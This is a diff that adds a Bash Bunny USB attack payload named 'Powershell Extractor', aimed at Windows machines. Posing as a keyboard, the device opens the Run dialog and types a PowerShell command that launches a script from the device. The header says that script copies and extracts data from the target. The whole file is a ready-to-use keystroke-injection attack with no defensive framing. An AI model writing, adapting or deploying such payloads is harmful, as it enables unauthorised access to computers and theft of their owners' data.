@@ -1,0 +1,21 @@
+#!/bin/bash
+#
+# Title:         Powershell Extractor
+# Author:        $irLurk$alot
+# Version:       1.0
+# Target:        Windows
+#
+# Executes d.cmd from the selected switch folder of the Bash Bunny USB Disk partition,
+# which in turn runs powershell script to copy move and extract data.
+
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+QUACK GUI r
+QUACK DELAY 100
+LED ATTACK
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\d.cmd')"
+QUACK ENTER
+LED FINISH
